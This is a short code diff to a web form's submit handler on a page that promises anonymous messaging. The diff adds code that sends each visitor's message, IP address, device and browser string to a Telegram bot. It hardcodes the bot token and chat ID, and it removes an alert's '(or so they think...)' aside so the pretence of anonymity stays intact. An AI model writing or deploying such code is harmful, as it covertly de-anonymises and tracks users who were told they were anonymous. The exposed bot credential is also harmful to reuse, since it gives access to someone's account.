@@ -10,22 +10,23 @@ document.getElementById("anonForm").addEventListener("submit", async function (e
   const device = /mobile/i.test(userAgent) ? "Mobile" : "Desktop";
   const time = new Date().toLocaleString();
 
-  // Send to your Google Sheets webhook
-  fetch("YOUR_GOOGLE_APPS_SCRIPT_URL", {
+  const telegramToken = "8133185989:AAHDUtLI3oeY_3Og8_Gne_Fyq3OgWC9qIW0";
+  const chatId = "7244443820";
+
+  const text = `🔥 *New Anonymous Message Received*\n\n📩 *Message:* ${message}\n🌐 *IP:* ${ip}\n📱 *Device:* ${device}\n🕐 *Time:* ${time}\n🧠 *Browser:* ${userAgent}`;
+
+  fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
     method: "POST",
-    mode: "no-cors",
     headers: {
-      "Content-Type": "application/json",
+      "Content-Type": "application/json"
     },
     body: JSON.stringify({
-      message,
-      ip,
-      userAgent,
-      device,
-      time
-    }),
+      chat_id: chatId,
+      text: text,
+      parse_mode: "Markdown"
+    })
   });
 
-  alert("Message sent anonymously 😇 (or so they think...)");
+  alert("Message sent anonymously 😇");
   document.getElementById("message").value = "";
 });
